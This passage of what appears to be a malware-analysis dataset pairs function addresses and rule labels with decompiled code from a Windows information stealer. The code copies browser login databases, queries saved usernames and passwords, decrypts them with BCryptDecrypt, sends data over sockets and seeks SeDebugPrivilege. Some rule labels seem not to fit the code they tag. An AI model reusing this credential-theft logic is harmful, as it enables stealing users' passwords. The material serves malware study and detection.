0x1303d0);\n        fcn.0040102c(var_10h, var_1ch + 0x20eca8, 0x235d0);\n        fcn.0040102c(var_4h, var_1ch + 0x232278, 0x14748);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathW;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x100, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_SetDllDirectoryW)(&lpPathName);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"softokn3.dll\");\n        (*pcVar1)(0x100, &var_428h);\n        (*pcVar2)(&var_428h, L\"msvcp140.dll\");\n        (*pcVar1)(0x100, &var_828h);\n        (*pcVar2)(&var_828h, L\"mozglue.dll\");\n        (*pcVar1)(0x100, &var_628h);\n        (*pcVar2)(&var_628h, L\"vcruntime140.dll\");\n        (*pcVar1)(0x100, &var_c28h);\n        (*pcVar2)(&var_c28h, L\"freebl3.dll\");\n        (*pcVar1)(0x100, &var_a28h);\n        (*pcVar2)(&var_a28h, L\"nss3.dll\");\n        pcVar3 = var_ch;\n        pcVar4 = var_14h;\n        if (((var_10h != NULL) && (pszPath != NULL)) &&\n           ((var_8h != NULL && (((var_4h != NULL && (var_ch != NULL)) && (var_14h != NULL)))))) {\n            if ((*var_10h == 'M') && (var_10h[1] == 'Z')) {\n                fcn.00411d78(0x235d0);\n            }\n            if ((*pszPath == 'M') && (pszPath[1] == 'Z')) {\n                fcn.00411d78(0x6b738);\n            }\n            if ((*var_8h == 'M') && (var_8h[1] == 'Z')) {\n                fcn.00411d78(0x217d0);\n            }\n            if ((*var_4h == 'M') && (var_4h[1] == 'Z')) {\n                fcn.00411d78(0x14748);\n            }\n            if ((*pcVar3 == 'M') && (pcVar3[1] == 'Z')) {\n                fcn.00411d78(0x519d0);\n            }\n            if ((*pcVar4 == 'M') && (pcVar4[1] == 'Z')) {\n                fcn.00411d78(0x1303d0);\n            }\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(&var_428h);\n        *(in_ECX + 0xac) = uVar7;\n        uVar7 = (*pcVar1)(&var_628h);\n        *(in_ECX + 0xbc) = uVar7;\n        uVar7 = (*pcVar1)(&var_828h);\n        *(in_ECX + 0xb0) = uVar7;\n        uVar7 = (*pcVar1)(&var_a28h);\n        *(in_ECX + 0xb4) = uVar7;\n        uVar7 = (*pcVar1)(&lpPathName);\n        *(in_ECX + 0xb8) = uVar7;\n        uVar7 = (*pcVar1)(&var_c28h);\n        *(in_ECX + 0xa4) = uVar7;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        fcn.00403036();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(arg_8h);\n        fcn.0040346a(0x414684);\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"nss3.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"msvcr120.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"msvcp120.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"mozglue.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"softokn3.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"vcruntime140.dll\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"msvcp\");\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(L\"msvcr\");\n        iVar5 = 0x5a;\n        var_20h = 0x5a;\n        do {\n            fcn.0040362d(&var_28h);\n            uVar7 = 0x415788;\n            iVar6 = iVar5;\n            fcn.00403272(iVar5);\n            fcn.0040346a(iVar6);\n            iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar6, uVar7);\n            if (iVar6 != 0) {\n                fcn.00403437(&pszPath);\n                fcn.00405ea5();\n                break;\n            }\n            iVar5 = iVar5 + 10;\n            fcn.00405ea5();\n            pszPath = NULL;\n        } while (iVar5 != 0x96);\n        iVar5 = 0x5a;\n        do {\n            fcn.0040362d(&var_24h);\n            uVar7 = 0x415788;\n            fcn.00403272(iVar5);\n            fcn.0040346a(iVar5);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar5, uVar7);\n            if (iVar5 != 0) {\n                fcn.00403437(&pszPath);\n                fcn.00405ea5();\n                break;\n            }\n            var_20h = var_20h + 10;\n            fcn.00405ea5();\n            pszPath = NULL;\n            iVar5 = var_20h;\n        } while (var_20h != 0x96);\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_18h);\n        *(in_ECX + 0xbc) = uVar7;\n        uVar7 = (*pcVar1)(var_8h);\n        *(in_ECX + 0xa8) = uVar7;\n        uVar7 = (*pcVar1)(var_4h);\n        *(in_ECX + 0xac) = uVar7;\n        uVar7 = (*pcVar1)(var_ch);\n        *(in_ECX + 0xb0) = uVar7;\n        uVar7 = (*pcVar1)(var_10h);\n        *(in_ECX + 0xb4) = uVar7;\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.00405ea5();\n    }\n    if (*(in_ECX + 0xb4) == 0) {\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = fcn.00410969(*(in_ECX + 0xb4));\n        *(in_ECX + 0x68) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x80) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x7c) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x70) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x74) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x78) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x6c) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x84) = uVar7;\n        uVar7 = fcn.00410969();\n        *(in_ECX + 0x88) = uVar7;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar7 = 1;\n    }\ncode_r0x0040c107:\n    fcn.00405ea5();\n    return uVar7;\n}\n",
        "token_count": 2893
    },
    "0040c4a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c4a8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint noname_0;\n    uint hKey;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_14h = 0;\n    var_18h = 0;\n    var_30h = in_ECX;\n    fcn.0040f76b();\n    fcn.0040346a(0x414684);\n    uVar2 = fcn.004034a7();\n    fcn.00403335(uVar2);\n    fcn.00405ea5();\n    fcn.0040346a(L\".tmp\");\n    fcn.0040f76b();\n    fcn.0040346a(0x414684);\n    uVar2 = fcn.004034a7();\n    fcn.00403335(uVar2);\n    fcn.00405ea5();\n    fcn.0040346a(L\".tmp\");\n    uVar2 = fcn.0040f76b();\n    fcn.00403437(uVar2);\n    fcn.00405ea5();\n    fcn.0040346a(arg_8h);\n    uVar2 = fcn.0040f76b();\n    fcn.00403437(uVar2);\n    fcn.00405ea5();\n    fcn.0040346a(arg_ch);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathFileExistsW;\n    iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(var_14h);\n    uVar2 = var_18h;\n    if ((((iVar3 != 0) && (iVar3 = (*pcVar1)(var_18h),  pcVar1 = _sym.imp.KERNEL32.dll_CopyFileW,  iVar3 != 0)) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_CopyFileW)(var_14h, var_8h, 0),  iVar3 != 0)) &&\n       (iVar3 = (*pcVar1)(uVar2, var_10h, 0),  iVar3 != 0)) {\n        fcn.00403437(&var_8h);\n        puVar4 = fcn.00403554(&arg_10h);\n        iVar3 = (**(in_ECX + 0x30))(*puVar4, &var_34h);\n        fcn.00405ea5();\n        if (iVar3 == 0) {\n            var_1ch = 0;\n            arg_ch = 0;\n            iVar5 = fcn.0040ced9(noname_0, noname_0, &var_1ch, &arg_ch);\n            iVar3 = in_ECX;\n            if (iVar5 != 0) {\n                pcVar6 = \"select signon_realm, origin_url, username_value, password_value from logins\";\n                if (arg_14h != '\\0') {\n                    pcVar6 = \"select signon_realm, origin_url, username_value, password_value from wow_logins\";\n                }\n                iVar5 = (**(in_ECX + 0x38))(var_34h, pcVar6, 0xffffffff, &var_ch, 0);\n                if (iVar5 == 0) {\n                    iVar5 = (**(in_ECX + 0x44))(var_ch);\n                    while (iVar5 == 100) {\n                        arg_14h = fcn.00405e22();\n                        fcn.00405e22();\n                        var_2ch = fcn.00405e22();\n                        arg_10h = fcn.00405e22();\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 0);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004033bf(pcVar6);\n                            fcn.00403125(uVar2);\n                            fcn.00405ea5();\n                        }\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 1);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004033bf(pcVar6);\n                            fcn.00403125(uVar2);\n                            fcn.00405ea5();\n                        }\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 2);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004033bf(pcVar6);\n                            fcn.00403125(uVar2);\n                            fcn.00405ea5();\n                        }\n                        uVar2 = var_1ch;\n                        hKey = arg_ch;\n                        (**(in_ECX + 0x5c))(var_ch, 3);\n                        (**(in_ECX + 0x54))(var_ch, 3);\n                        uVar2 = fcn.0040cf58(uVar2, hKey);\n                        uVar2 = fcn.004033bf(uVar2);\n                        fcn.00403125(uVar2);\n                        fcn.00405ea5();\n                        iVar3 = fcn.0040308c();\n                        if ((0 < iVar3) || (iVar3 = fcn.0040308c(),  0 < iVar3)) {\n                            var_54h = 0;\n                            var_50h = 0;\n                            var_4ch = 0;\n                            iVar3 = fcn.0040308c();\n                            if (0 < iVar3) {\n                                uVar2 = fcn.0040309d(&var_20h);\n                                fcn.00403437(uVar2);\n                                fcn.00405ea5();\n                                var_20h = 0;\n                            }\n                            iVar3 = fcn.0040308c();\n                            if (0 < iVar3) {\n                                uVar2 = fcn.0040309d(&var_24h);\n                                fcn.00403437(uVar2);\n                                fcn.00405ea5();\n                                var_24h = 0;\n                            }\n                            iVar3 = fcn.0040308c();\n                            if (iVar3 != 0) {\n                                uVar2 = fcn.0040309d(&var_28h);\n                                fcn.00403437(uVar2);\n                                fcn.00405ea5();\n                                var_28h = 0;\n                            }\n                            var_48h = arg_18h;\n                            puVar4 = &var_54h;\n                            fcn.00401f95(puVar4);\n                            fcn.00401fcb(puVar4);\n                            fcn.004013ef();\n                        }\n                        fcn.00405ea5();\n                        fcn.00405ea5();\n                        fcn.00405ea5();\n                        fcn.00405ea5();\n                        iVar5 = (**(in_ECX + 0x44))(var_ch);\n                        iVar3 = var_30h;\n                    }\n                    if (iVar5 != 0) goto code_r0x0040c606;\n                }\n            }\n            uVar2 = 1;\n            (**(iVar3 + 0x60))(var_ch);\n            (**(iVar3 + 0x34))(var_34h);\n            puVar4 = &var_8h;\n            fcn.0040362d(puVar4);\n            fcn.0040ff0b(puVar4);\n            puVar4 = &var_10h;\n            fcn.0040362d(puVar4);\n            fcn.0040ff0b(puVar4);\n            goto code_r0x0040c62a;\n        }\ncode_r0x0040c606:\n        puVar4 = &var_8h;\n        fcn.0040362d(puVar4);\n        fcn.0040ff0b(puVar4);\n        puVar4 = &var_10h;\n        fcn.0040362d(puVar4);\n        fcn.0040ff0b(puVar4);\n    }\n    uVar2 = 0;\ncode_r0x0040c62a:\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return uVar2;\n}\n",
        "token_count": 2015
    },
    "0040ce83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ce83(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (param_1 != 0) {\n        if (*(param_1 + 0x30) != 0) {\n            (*_sym.imp.KERNEL32.dll_LocalFree)(*(param_1 + 0x30));\n        }\n        if (*(param_1 + 0x40) != 0) {\n            (*pcVar1)(*(param_1 + 0x40));\n        }\n        if (*(param_1 + 0x48) != 0) {\n            (*pcVar1)(*(param_1 + 0x48));\n        }\n        if (*(param_1 + 0x58) != 0) {\n            (*pcVar1)(*(param_1 + 0x58));\n        }\n        if (*(param_1 + 0x60) != 0) {\n            (*pcVar1)(*(param_1 + 0x60));\n        }\n        if (*(param_1 + 0x68) != 0) {\n            (*pcVar1)(*(param_1 + 0x68));\n        }\n        (*pcVar1)(param_1);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "0040cf58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040cf58(int32_t arg_8h, int32_t hKey)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t pbInput;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_10h;\n    int32_t cbInput;\n    uint var_8h;\n    \n    var_8h._0_2_ = 0x3176;\n    var_8h._2_1_ = 0x30;\n    if (2 < in_EDX) {\n        in_stack_ffffff88 = 0x40cf84;\n        iVar1 = fcn.00401000(in_ECX, &fcn.0040cf58::var_8h, 3);\n        if (iVar1 == 0) {\n            if (arg_8h == 0) {\n                return 0;\n            }\n            if (hKey == 0) {\n                return 0;\n            }\n            fcn.00401052(&fcn.0040cf58::var_54h, 0, 0x40);\n            var_4ch = in_ECX + 3;\n            var_54h = 0x40;\n            var_50h = 1;\n            var_3ch = (in_EDX - 0x10) + in_ECX;\n            pbInput = 0xc;\n            cbInput = in_EDX - 0x1f;\n            var_38h = 0x10;\n            var_10h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, cbInput);\n            if (var_10h == 0) {\n                return 0;\n            }\n            iVar1 = (*_sym.imp.bcrypt.dll_BCryptDecrypt)\n                              (hKey, var_4ch + pbInput, cbInput, &fcn.0040cf58::var_54h, 0, 0, var_10h, cbInput, \n                               &fcn.0040cf58::cbInput, 0);\n            if (iVar1 != 0) {\n                return 0x416056;\n            }\n            arg_8h_00 = fcn.00401085(cbInput + 1);\n            fcn.00401052(arg_8h_00, 0, cbInput + 1);\n            fcn.0040102c(arg_8h_00, var_10h, cbInput);\n            goto code_r0x0040d096;\n        }\n    }\n    iVar1 = fcn.0040ca78(in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, in_stack_ffffff88, \n                         &fcn.0040cf58::var_10h, &fcn.0040cf58::cbInput);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    arg_8h_00 = fcn.00401085(cbInput + 1);\n    fcn.00401052(arg_8h_00, 0, cbInput + 1);\n    fcn.0040102c(arg_8h_00, var_10h, cbInput);\ncode_r0x0040d096:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(var_10h);\n    return arg_8h_00;\n}\n",
        "token_count": 832
    },
    "0040d17d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d17d(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint hostshort;\n    uint uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = in_ECX + 0xf6;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    uVar4 = extraout_ECX;\n    if (in_ECX[0x7b] == 0) {\n        uVar6 = *(arg_8h + 0xc);\n        iVar5 = arg_8h + 8;\n        hostshort = extraout_ECX;\n        fcn.004033f5(iVar5);\n        iVar3 = fcn.004057fb(iVar5, hostshort);\n        uVar4 = extraout_ECX_00;\n        if (iVar3 != 0) goto code_r0x0040d1be;\ncode_r0x0040d1dc:\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1, iVar5, hostshort, uVar6);\n        uVar4 = 1;\n    }\n    else {\ncode_r0x0040d1be:\n        if (in_ECX[3] == 0) {\n            uVar6 = *(arg_8h + 4);\n            fcn.004033f5(arg_8h);\n            iVar3 = fcn.004057fb(arg_8h, uVar4);\n            iVar5 = arg_8h;\n            hostshort = uVar4;\n            if (iVar3 == 0) goto code_r0x0040d1dc;\n        }\n        iVar5 = fcn.00402190(0);\n        if (iVar5 == 0) {\n            fcn.00401f76();\n        }\n        iVar5 = fcn.00402190(0);\n        if (iVar5 == 0) {\n            fcn.00401f76();\n        }\n        var_8h = in_ECX[4];\n        var_4h = in_ECX[0x7c];\n        fcn.00401f4b(fcn.0040d0a3, &var_8h);\n        fcn.00401f4b(fcn.0040d110, &var_8h);\n        pcVar2 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n        *in_ECX = 1;\n        (*pcVar2)(puVar1);\n        fcn.00402190(0xffffffff);\n        fcn.00402190(0xffffffff);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        *in_ECX = 0;\n        (*pcVar2)(puVar1);\n        fcn.0040d328();\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 678
    },
    "0040d2ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d2ad(int32_t buf)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = buf;\n    if (buf == 0) {\ncode_r0x0040d2e3:\n        uVar2 = 0;\n    }\n    else {\n        do {\n            iVar1 = (*_sym.imp.WS2_32.dll_send)(in_ECX, (in_EDX - iVar3) + buf, iVar3, 0);\n            if (iVar1 == -1) goto code_r0x0040d2e3;\n            iVar3 = iVar3 - iVar1;\n        } while (iVar3 != 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 197
    },
    "0040d36c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d3cc)\n\nvoid __cdecl fcn.0040d36c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t lpParameter;\n    uint hObject;\n    uint var_4h;\n    \n    *0x54df3c = arg_8h;\n    lpParameter = fcn.00405eff();\n    fcn.00403125(&arg_14h);\n    *(lpParameter + 4) = 0xd3d;\n    fcn.00403125(&arg_ch);\n    *(lpParameter + 0xc) = arg_10h;\n    *(lpParameter + 0x10) = 0x54db68;\n    fcn.00401f4b(fcn.0040d29a, lpParameter);\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 211
    },
    "0040da5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040da5b(int32_t param_1)\n\n{\n    int32_t lpString2_00;\n    bool bVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    bVar1 = false;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n    if (iVar2 != 0) {\n        lpString2_00 = param_1 + 0x28;\n        var_24h = 1;\n        do {\n            var_ch = 0;\n            (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)(iVar2, 0, 0x30, 3, 0, 0, &var_10h, &var_4h, &var_ch, 0);\n            uVar5 = var_10h;\n            piVar3 = fcn.00405eff();\n            iVar4 = (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)\n                              (iVar2, 0, 0x30, 3, piVar3, uVar5, &var_10h, &var_4h, &var_ch, 0);\n            if ((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0xea)) break;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            uVar7 = 0;\n            piVar6 = piVar3;\n            if (var_4h == 0) break;\n            while( true ) {\n                if (*piVar6 == 0) goto code_r0x0040db3c;\n                fcn.004035e5(*piVar6);\n                iVar2 = fcn.00403248(lpString2_00);\n                if (iVar2 != 0) break;\n                fcn.00405ea5();\n                lpString1 = 0;\n                uVar7 = uVar7 + 1;\n                piVar6 = piVar6 + 0xb;\n                if (var_4h <= uVar7) goto code_r0x0040db3c;\n            }\n            uVar5 = fcn.004035e5(piVar3[uVar7 * 0xb]);\n            fcn.00403437(uVar5);\n            fcn.00405ea5();\n            *(param_1 + 0x2c) = piVar3[uVar7 * 0xb + 9];\n            fcn.00405ea5();\n            lpString1 = 0;\n            if (*(param_1 + 0x2c) != 0) {\n                uVar8 = 0;\n                uVar7 = var_4h;\n                if (var_4h == 0) goto code_r0x0040db40;\n                goto code_r0x0040dbdd;\n            }\n            if (bVar1) break;\n            fcn.0040d49c(lpString2_00, 2);\n            fcn.0040d508(lpString2_00);\n            bVar1 = true;\n            fcn.00401099(piVar3);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n        } while (iVar2 != 0);\n    }\ncode_r0x0040db3c:\n    var_24h = 0;\n    goto code_r0x0040db40;\n    while( true ) {\n        if (piVar3[9] == *(param_1 + 0x2c)) {\n            fcn.004035e5(*piVar3);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(lpString1, 0);\n            if (iVar2 != 0) {\n                iVar2 = *piVar3;\n                fcn.004035e5(iVar2);\n                fcn.004021bd(iVar2);\n            }\n            fcn.00405ea5();\n            uVar7 = var_4h;\n        }\n        lpString1 = 0;\n        uVar8 = uVar8 + 1;\n        piVar3 = piVar3 + 0xb;\n        if (uVar7 <= uVar8) break;\ncode_r0x0040dbdd:\n        lpString1 = 0;\n        if (*piVar3 == 0) break;\n    }\ncode_r0x0040db40:\n    fcn.00405ea5();\n    return var_24h;\n}\n",
        "token_count": 1140
    },
    "0040ded2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040e022)\n// WARNING: Removing unreachable block (ram,0x0040e031)\n// WARNING: Removing unreachable block (ram,0x0040e049)\n// WARNING: Removing unreachable block (ram,0x0040e058)\n// WARNING: Removing unreachable block (ram,0x0040e070)\n\nuint __fastcall fcn.0040ded2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint uVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    uint in_stack_ffffff58;\n    int32_t in_stack_ffffff70;\n    \n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar1 = fcn.0040fc58();\n    if (iVar1 == 1) {\n        fcn.0040f7e0();\n    }\n    iVar1 = param_1 + 0x38;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    if (iVar2 == 0) {\n        uVar4 = extraout_ECX;\n        fcn.0040362d(iVar1);\n        fcn.00410203(iVar1, uVar4);\n        iVar1 = param_1 + 0x40;\n        iVar2 = extraout_ECX_00;\n        fcn.0040362d(iVar1);\n        fcn.00410203(iVar1, iVar2);\n        iVar1 = fcn.0040fc58();\n        if (iVar1 == 1) {\n            uVar4 = fcn.00413786(&stack0xffffff98, *(param_1 + 100), 2);\n            fcn.00402e93(uVar4);\n            fcn.00403036();\n            fcn.00402f91(0, 0x1c800);\n            uVar4 = 0x1c800;\n            iVar2 = iVar2 + -0x1c800;\n        }\n        else {\n            uVar4 = fcn.00413786(&stack0xffffff98, *(param_1 + 100), 1);\n            fcn.00402e93(uVar4);\n            fcn.00403036();\n            fcn.00402f91(0, 0x12e00);\n            uVar4 = 0x12e00;\n            iVar2 = iVar2 + -0x12e00;\n        }\n        fcn.00402f91(uVar4, iVar2);\n        fcn.00403036();\n        fcn.00403036();\n        fcn.0040feed();\ncode_r0x0040e011:\n        fcn.0040feed();\n        uVar4 = 0xffffffff;\n    }\n    else {\n        iVar1 = param_1 + 0x3c;\n        puVar7 = &stack0xffffff68;\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n        if (iVar2 == 0) {\n            uVar3 = extraout_ECX_01;\n            fcn.0040362d(iVar1);\n            fcn.00410203(iVar1, uVar3);\n            in_stack_ffffff58 = 3;\n            fcn.00413786(&stack0xffffff7c, *(param_1 + 100), 3);\n            if (in_stack_ffffff70 == 0) {\n                fcn.00403036();\n                goto code_r0x0040e011;\n            }\n            iVar1 = fcn.0040fdf0(extraout_ECX_02, extraout_ECX_02);\n            if (iVar1 != 0) {\n                uVar3 = extraout_ECX_03;\n                fcn.0041013d(&stack0xffffff68);\n                fcn.00410125(puVar7, uVar3);\n            }\n            fcn.00403036();\n            fcn.0040feed();\n        }\n        fcn.0040dcb2();\n        fcn.0040dc99();\n        iVar1 = fcn.0040da5b();\n        if (iVar1 == 0) {\n            fcn.0040f7b9();\n            iVar1 = param_1 + 0x5c;\n            iVar2 = 4;\n        }\n        else {\n            iVar1 = fcn.0040d9b6();\n            if (iVar1 == 0) {\n                fcn.0040f7b9();\n                iVar1 = param_1 + 0x60;\n                iVar2 = param_1 + 0x5c;\n                in_stack_ffffff58 = 6;\n            }\n            else {\n                fcn.0040dc36();\n                fcn.004035e5(L\"SeDebugPrivilege\");\n                (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar1 = fcn.0040f619();\n                fcn.00405ea5();\n                if (iVar1 == 0) {\n                    fcn.0040f7b9();\n                    iVar1 = param_1 + 0x60;\n                    iVar2 = param_1 + 0x5c;\n                    in_stack_ffffff58 = 3;\n                }\n                else {\n                    iVar1 = fcn.00410cf6();\n                    pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                    if (iVar1 == 0) {\n                        fcn.0040f7b9();\n                        iVar1 = param_1 + 0x60;\n                        iVar2 = param_1 + 0x5c;\n                        in_stack_ffffff58 = 5;\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        if (*(param_1 + 0x4c) != 0) {\n                            uVar5 = 0;\n                            do {\n                                fcn.00405ca3();\n                                fcn.0040362d(*(param_1 + 0x44) + uVar5 * 4);\n                                fcn.0040d508(&stack0xffffff6c);\n                                fcn.00405ea5();\n                                uVar5 = uVar5 + 1;\n                                pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                            } while (uVar5 < 